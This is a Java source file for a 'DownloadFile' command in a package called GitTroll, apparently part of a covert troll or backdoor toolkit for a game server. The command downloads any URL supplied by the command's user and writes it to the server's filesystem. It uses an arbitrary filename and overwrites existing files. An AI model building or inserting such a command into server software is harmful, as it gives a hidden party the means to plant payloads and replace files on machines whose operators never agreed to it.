package net.Lenni0451.GitTroll.command.commands.server;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.List;
import java.util.regex.Pattern;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class DownloadFile extends CommandBase {

	public DownloadFile() {
		super("DownloadFile", "Download a file to the server (URL has to be direct)", "<URL> [Filename]");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1) || args.isLength(2)) {
			try {
				URL url = new URL(args.getString(0));
				String fileName = args.isLength(2)?args.getString(1):(args.getString(0).split(Pattern.quote("/"))[args.getString(0).split(Pattern.quote("/")).length - 1]);
				File dlFile = new File(fileName);
				
				if(dlFile.exists()) {
					executor.sendGitMessage("§5The file already exists and will be overwritten.");
				}
				BufferedInputStream bis = new BufferedInputStream(url.openConnection().getInputStream());
				FileOutputStream fos = new FileOutputStream(dlFile);
				int length;
				byte[] buffer = new byte[1024];
				while((length = bis.read(buffer)) != -1) {
					fos.write(buffer, 0, length);
				}
				fos.close();
				bis.close();
				
				executor.sendGitMessage("The file has been successfully downloaded!");
				executor.sendGitMessage("§6" + dlFile.getAbsolutePath());
			} catch (MalformedURLException e) {
				executor.sendGitMessage("§cThe entered url is invalid.");
			} catch (Exception e) {
				executor.sendGitMessage("§cCould not download the file.");
				executor.sendGitMessage("§6" + e.getClass().getSimpleName());
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
